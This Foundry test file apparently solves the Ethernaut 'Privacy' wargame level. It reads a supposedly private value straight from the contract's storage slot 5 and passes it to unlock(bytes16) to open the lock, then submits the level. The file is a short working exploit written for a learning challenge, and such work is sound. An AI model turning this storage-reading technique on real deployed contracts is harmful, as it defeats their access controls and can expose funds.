// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract PrivacyTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x45Ce20214BE68DE910cB1b8995a8f35C07147D61);
  }

  function testExploit() public {
    // variables of this data array are at slots 3, 4, and 5
    bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));

    (bool success,) = challengeAddress.call(abi.encodeWithSignature("unlock(bytes16)", key));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
